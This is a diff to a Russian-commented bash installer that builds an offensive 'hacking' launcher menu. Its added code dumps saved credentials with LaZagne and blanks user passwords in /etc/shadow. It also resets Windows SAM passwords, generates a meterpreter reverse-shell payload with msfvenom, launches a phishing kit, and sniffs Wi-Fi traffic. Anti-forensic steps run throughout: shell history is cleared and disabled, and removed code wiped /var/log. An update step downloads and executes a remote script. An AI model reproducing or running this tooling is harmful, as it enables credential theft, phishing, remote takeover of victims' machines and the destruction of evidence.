@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="31.1"
+CURRENT_VERSION="31.2"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -592,26 +592,24 @@ generate_launcher_code() {
     local v_num="$2"
     local code
 
-    # Собираем код лаунчера в переменную
+    # Используем одинарные кавычки 'EOF', чтобы переменные внутри не раскрывались при записи
     code=$(cat << 'EOF'
 #!/bin/bash
 CURRENT_VERSION="{{V_NUM}}"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 set +o history
 
-# Решение проблемы с кэшем ZSH
+# --- Инициализация системы ---
 if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
     rm -f /root/.cache/zcompdump* 2>/dev/null
     rm -f /root/.zcompdump* 2>/dev/null
 fi
 
-# 1. Определяем текущий локальный IP
 CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
 [ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"
 
-# 2. Настраиваем dnsmasq
+# Настройка DNS
 if command -v dnsmasq >/dev/null 2>&1; then
-    echo -e "${G}[*] Configuring DNS: scanclamavlocal -> $CURRENT_IP${NC}"
     cat << EOD > /etc/dnsmasq.conf
 domain-needed
 bogus-priv
@@ -619,208 +617,171 @@ interface=lo
 interface=wlan0
 address=/scanclamavlocal/$CURRENT_IP
 EOD
-    if [ -f /etc/init.d/dnsmasq ]; then
-        service dnsmasq restart 2>/dev/null
-    else
-        killall dnsmasq 2>/dev/null
-        dnsmasq -C /etc/dnsmasq.conf 2>/dev/null
-    fi
+    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
 fi
 
+# --- Базовые функции ---
 repair() { 
     sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
     rm -rf /root/.cache/* /tmp/* 2>/dev/null
     history -c
 }
 
-get_stats() {
-    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
-    local rom=$(df -h / | awk 'NR==2 {print $4}')
-    local sd_path=$(ls -d /storage/* 2>/dev/null | grep -vE "self|emulated" | head -n 1)
-    local sd_info="N/A"
-    [ -n "$sd_path" ] && sd_info=$(df -h "$sd_path" | awk 'NR==2 {print $4}')
-    local net="${R}OFFLINE${NC}"
-    ping -c 1 -W 1 8.8.8.8 >/dev/null 2>&1 && net="${G}ONLINE${NC}"
-    local srv=""
-    pgrep -f "av_server.py" >/dev/null && srv+=" ${G}[AV]${NC}"
-    pgrep -f "share_server.py" >/dev/null && srv+=" ${G}[SH]${NC}"
-    pgrep -f "upload_server.py" >/dev/null && srv+=" ${G}[UP]${NC}"
-    [ -z "$srv" ] && srv="${R}NONE${NC}"
-    echo -e "${Y}RAM: ${G}$ram ${Y}| ROM: ${G}$rom ${Y}| SD: ${G}$sd_info"
-    echo -e "${Y}NET: $net ${Y}| ACTIVE SRV:$srv${NC}"
-}
-
-# --- БАЗА TOOLS_DATA ---
-TOOLS_DATA=(
-    "zphisher;https://github.com/htr-tech/zphisher/archive/refs/heads/master.zip;zphisher.sh;"
-    "seeker;https://github.com/thewhiteh4t/seeker/archive/refs/heads/master.zip;seeker.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "blackeye;https://github.com/An0nUD4Y/blackeye/archive/refs/heads/master.zip;blackeye.sh;"
-    "wifite2;https://github.com/derv82/wifite2/archive/refs/heads/master.zip;wifite.py;python3 setup.py install --break-system-packages"
-    "routersploit;https://github.com/threat9/routersploit/archive/refs/heads/master.zip;rsf.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "kickthemout;https://github.com/k4m4/kickthemout/archive/refs/heads/master.zip;kickthemout.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "sqlmap;https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip;sqlmap.py;"
-    "admin-finder;https://github.com/the-c0d3r/admin-panic/archive/refs/heads/master.zip;admin-panic.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "commix;https://github.com/commixproject/commix/archive/refs/heads/master.zip;commix.py;"
-    "photon;https://github.com/s0md3v/Photon/archive/refs/heads/master.zip;photon.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "sherlock;https://github.com/sherlock-project/sherlock/archive/refs/heads/master.zip;sherlock_project/sherlock.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "infoga;https://github.com/m4ll0k/Infoga/archive/refs/heads/master.zip;infoga.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "phoneinfoga;https://github.com/sundowndev/phoneinfoga/archive/refs/heads/master.zip;phoneinfoga.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "recon-dog;https://github.com/s0md3v/ReconDog/archive/refs/heads/master.zip;dog;"
-    "ghost-framework;https://github.com/EntySec/Ghost/archive/refs/heads/master.zip;ghost;python3 -m pip install -r requirements.txt --break-system-packages"
-    "cupp;https://github.com/Mebus/cupp/archive/refs/heads/master.zip;cupp.py;"
-    "instashell;https://github.com/thelinuxchoice/instashell/archive/refs/heads/master.zip;instashell.sh;chmod +x install.sh && ./install.sh"
-)
-
-# Дополнительные инструменты для EXPLOIT HUB
-TOOLS_DATA+=(
-    "lazagne;https://github.com/AlessandroZ/LaZagne/archive/refs/heads/master.zip;laZagne.py;python3 -m pip install -r requirements.txt --break-system-packages"
-    "sliver;https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux;sliver-server;chmod +x sliver-server"
-    "exploitdb;https://github.com/offensive-security/exploitdb/archive/refs/heads/master.zip;searchsploit;ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit"
-)
-
 zero_clear() {
     rm -rf /tmp/* /root/.npm/_logs/* > /dev/null 2>&1
     sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
 }
 
+get_stats() {
+    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
+    local rom=$(df -h / | awk 'NR==2 {print $4}')
+    local sd_info=$(df -h /storage/emulated 2>/dev/null | awk 'NR==2 {print $4}')
+    [ -z "$sd_info" ] && sd_info="N/A"
+    local net="${R}OFFLINE${NC}"; ping -c 1 -W 1 8.8.8.8 >/dev/null 2>&1 && net="${G}ONLINE${NC}"
+    local srv=""; pgrep -f "av_server.py" >/dev/null && srv+=" ${G}[AV]${NC}"; pgrep -f "share_server.py" >/dev/null && srv+=" ${G}[SH]${NC}"; pgrep -f "upload_server.py" >/dev/null && srv+=" ${G}[UP]${NC}"
+    [ -z "$srv" ] && srv="${R}NONE${NC}"
+    echo -e "${Y}RAM: ${G}$ram ${Y}| ROM: ${G}$rom ${Y}| SD: ${G}$sd_info"
+    echo -e "${Y}NET: $net ${Y}| ACTIVE SRV:$srv${NC}"
+}
+
+# --- Универсальный контроллер ---
 prime_dynamic_controller() {
-    local title=$1
-    local -a labels=($2)
-    local -a actions=($3)
+    local title=$1; local labels=($2); local actions=($3)
     while true; do
-        clear
-        echo -e "${R}========== [ $title ] ==========${NC}"
-        get_stats
-        echo -e "---------------------------------------"
+        clear; echo -e "${R}========== [ $title ] ==========${NC}"
+        get_stats; echo -e "---------------------------------------"
         for ((i=0; i<${#labels[@]}; i++)); do
             printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
             if (( (i+1) % 2 == 0 )); then echo ""; fi
         done
-        echo -e "\n${Y} B) BACK / EXIT${NC}"
-        echo -e "---------------------------------------"
+        echo -e "\n${Y} B) BACK / EXIT${NC}\n---------------------------------------"
         read -p ">> " choice
-        if [[ "$choice" =~ ^[Bb]$ ]]; then return; fi
+        [[ "$choice" =~ ^[Bb]$ ]] && return
         if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
-            local idx=$((choice-1))
-            echo -e "${B}[*] Запуск: ${labels[$idx]}...${NC}"
-            ${actions[$idx]}
+            ${actions[$((choice-1))]}
         else
-            echo -e "${R}[!] Ошибка: выберите пункт от 1 до ${#labels[@]}${NC}"
-            sleep 1
+            echo -e "${R}[!] Ошибка${NC}"; sleep 1
         fi
     done
 }
 
-# --- ФУНКЦИИ МОДУЛЕЙ ---
-run_ghost_scan() { read -p "Target IP: " t; [ -n "$t" ] && nmap -F "$t"; read -p "Enter..."; }
-run_phishing() { [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh; }
-run_sqlmap() { read -p "URL: " target; [ -n "$target" ] && sqlmap -u "$target" --batch --random-agent; }
-run_osint() { echo -e "${Y}OSINT Logic...${NC}"; sleep 2; }
+# --- Модули: OSINT ---
+run_osint() {
+    clear; zero_clear; echo -e "${Y}>>> [ SMART OSINT 2026 ] <<<${NC}"
+    read -p "Input (Nick/Phone/Email): " i; [ -z "$i" ] && return
+    socialscan "$i"; python3 /root/infoga/infoga.py --target "$i" 2>/dev/null
+    pause
+}
 
+run_osint2() {
+    clear; echo -e "${Y}>>> [ TOTAL OSINT 2: DEEP AUTO-PILOT ] <<<${NC}"
+    read -p "Target: " i; [ -z "$i" ] && return
+    socialscan "$i"; maigret "$i" --parse --timeout 20; python3 /root/blackbird/blackbird.py -u "$i"
+    pause
+}
 
-# --- РАЗДЕЛ: DEVICE HACK (Пункт 5) ---
+# --- Модули: DEVICE & NETWORK (Пункт 5) ---
 run_device_hack() {
-    local names="Multi-OS Recovery;PC Control;Anti-Forensic;Back"
-    local funcs="run_recovery run_pc_control run_anti_forensic run_main_menu"
-    prime_dynamic_controller "DEVICE HACK" "$names" "$funcs"
+    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Multi-OS_Recovery Bluetooth_Scan Anti-Forensic"
+    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit pc_password_recovery scan_bluetooth_devices clear_logs_and_traces"
+    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
 }
-
-run_recovery() {
-    echo -e "${G}[*] Запуск Multi-OS Recovery (LaZagne)...${NC}"
-    # Проверяем наличие модуля в папке core-prime-tools
-    if [ -f "/root/core-prime-tools/modules/lazagne.py" ]; then
-        python3 /root/core-prime-tools/modules/lazagne.py all
-    else
-        echo -e "${R}[!] Ошибка: Модуль паролей не найден по пути /root/core-prime-tools/modules/lazagne.py${NC}"
-    fi
-    pause
-    run_device_hack
-}
-
-run_pc_control() {
-    echo -e "${G}[*] Активация PC Control Mode...${NC}"
-    # Здесь должен быть вызов твоего основного контроллера для ПК
-    if [ -f "/root/core-prime-tools/modules/pc_control.sh" ]; then
-        bash /root/core-prime-tools/modules/pc_control.sh
-    else
-        echo -e "${Y}[!] Исполняемый файл pc_control.sh не найден.${NC}"
-        echo -e "${W}[*] Попытка запуска универсального метода...${NC}"
-        sleep 1
-    fi
-    run_device_hack
-}
-
-run_anti_forensic() {
-    echo -e "${R}[!] ВНИМАНИЕ: Очистка следов системы...${NC}"
-    history -c
-    rm -rf /var/log/* 2>/dev/null
-    echo -e "${G}[+] Логи очищены.${NC}"
-    pause
-    run_device_hack
-}
-
-
-
-run_update_system() {
-    echo -e "${B}[*] Проверка обновлений на GitHub...${NC}"
-    if ping -c 1 google.com &>/dev/null; then
-        cd /root/core-prime-tools
-        git fetch --all
-        git reset --hard origin/main
-        chmod +x install_all.sh
-        echo -e "${G}[+] Обновление завершено. Перезапусти инсталлер.${NC}"
-    else
-        echo -e "${R}[!] Нет сети. Проверь подключение.${NC}"
-    fi
-    pause
-    run_main_menu
-}
-
 
 launch_ghost_manual() { cd /root/Ghost && python3 -m ghost; }
-analyze_network_traffic() { tshark -i wlan0; }
-launch_ghost_autopwn() { read -p "IP: " tip; cd /root/Ghost && python3 -m ghost --execute "connect $tip"; }
-scan_bluetooth_devices() { hcitool scan; read -p "Enter..."; }
+launch_ghost_autopwn() { read -p "Target IP: " t; cd /root/Ghost && python3 -m ghost --execute "connect $t"; pause; }
 
+analyze_network_traffic() {
+    local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
+    local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
+    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
+}
+
+run_host_monitor() { tshark -i wlan0 -T fields -e ip.src -e ip.dst; }
+run_http_dns_sniffer() { tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name; }
+run_traffic_record() { mkdir -p /root/reports; tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap; }
+
+# --- Модули: RECOVERY & PASSWORDS ---
+pc_password_recovery() {
+    local p_names="Extract_Passwords Reset_OS_Password Heuristic_Scan"
+    local p_funcs="extract_all_passwords reset_any_os_password smart_threat_scan"
+    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
+}
+
+extract_all_passwords() {
+    cd /root/lazagne && python3 lazagne.py all -oN /root/reports/passwords.txt
+    echo -e "${G}[+] Saved to /root/reports/passwords.txt${NC}"; pause
+}
+
+reset_any_os_password() {
+    local r_names="Windows_(SAM) Linux_(Shadow) macOS"
+    local r_funcs="reset_windows_password reset_linux_pass reset_macos_info"
+    prime_dynamic_controller "OS PASSWORD RESET" "$r_names" "$r_funcs"
+}
+
+reset_windows_password() {
+    local sam=$(find /mnt /media -type f -name "SAM" -path "*/System32/config/*" | head -n 1)
+    [ -n "$sam" ] && chntpw -i "$sam" || echo -e "${R}SAM не найден${NC}"; pause
+}
+
+reset_linux_pass() { read -p "User: " u; sed -i "s/^$u:[^:]*:/$u::/" /etc/shadow; pause; }
+reset_macos_info() { echo "dscl . -passwd /Users/username newpassword"; pause; }
+
+# --- Модули: EXPLOIT HUB (Пункт 6) ---
 run_exploit_hub() {
     local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
-    local ex_funcs="ex_phonesploit_pro run_sqlmap ex_pc_network_scan run_pc_control"
+    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
     prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
 }
 
-ex_phonesploit_pro() { cd /root/PhoneSploit-Pro && python3 phonesploitpro.py; }
-ex_pc_network_scan() { read -p "IP: " t; nmap -sV --script vuln "$t"; read -p "Enter..."; }
-run_pc_control() { echo -e "PC Control Mode..."; sleep 2; }
+run_pc_control() {
+    local pc_names="Payload_Generator Password_Stealer Post-Exploit_Menu"
+    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
+    prime_dynamic_controller "PC CONTROL & AUDIT" "$pc_names" "$pc_funcs"
+}
 
-run_osint2() { echo -e "Deep OSINT..."; sleep 2; }
-run_iban_scan() { read -p "IBAN: " iban; python3 /root/iban_check.py "$iban"; }
-update_prime() { echo -e "Checking updates..."; sleep 2; }
+pc_gen_payload() { read -p "LHOST: " lh; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe; pause; }
+
+# --- Системные функции ---
+run_sqlmap() { read -p "URL: " u; [ -n "$u" ] && sqlmap -u "$u" --batch --random-agent; pause; }
+run_iban_scan() { read -p "IBAN: " i; python3 /root/iban_check.py "$(echo $i | tr -d ' ')"; pause; }
+run_phishing() { [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh; }
+run_ghost_scan() { read -p "IP: " t; nmap -F "$t"; pause; }
+run_repair() { repair; echo -e "${G}[+] Cleaned${NC}"; pause; }
+run_system_info() { clear; get_stats; pause; }
+
 run_servers() {
     local s_names="AV-Scanner Share-File Upload-Inbound"
     local s_funcs="run_av_srv run_share_srv run_upload_srv"
-    prime_dynamic_controller "SERVICE HUB" "$s_names" "$s_funcs"
+    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
 }
+
 run_av_srv() { python3 /root/av_server.py; }
 run_share_srv() { python3 /root/share_server.py; }
 run_upload_srv() { python3 /root/upload_server.py; }
 
-exit_script() {
-    echo -e "${Y}[*] Очистка истории...${NC}"
-    history -c
-    exit 0
+update_prime() {
+    echo -e "${B}[*] Updating...${NC}"
+    curl -L https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh -o /root/install_all.sh
+    chmod +x /root/install_all.sh && exec /root/install_all.sh
 }
 
+pause() { read -p "Press Enter..." dummy; }
+
+exit_script() { history -c; exit 0; }
+
+# --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
-    local m_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL UPDATE_CORE SERVICE_HUB EXIT"
-    local m_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_payload_gen run_web_attack run_installer run_repair run_system_info exit_script"
-    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$m_names" "$m_funcs"
+    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL REPAIR SYSTEM_INFO EXIT"
+    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools run_repair run_system_info exit_script"
+    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
 
-# START
+# --- Точка входа ---
 repair
 run_main_menu
 EOF
 )
+
     # Применяем версию и записываем
     code="${code//\{\{V_NUM\}\}/$v_num}"
     smart_cat "$target_file" "$code"
@@ -833,7 +794,7 @@ update_module "/root/share_server.py" "1.0" generate_share_server_code "File-Sha
 update_module "/root/upload_server.py"  "1.0.4" generate_upload_server_code  "Inbound-Drop-Box"
 
 # --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
-update_module "/root/launcher.sh" "31.0" generate_launcher_code "Prime-Launcher"
+update_module "/root/launcher.sh" "31.1" generate_launcher_code "Prime-Launcher"
 chmod +x /root/launcher.sh
 ln -sf /root/launcher.sh /usr/local/bin/launcher
 repair_and_clean
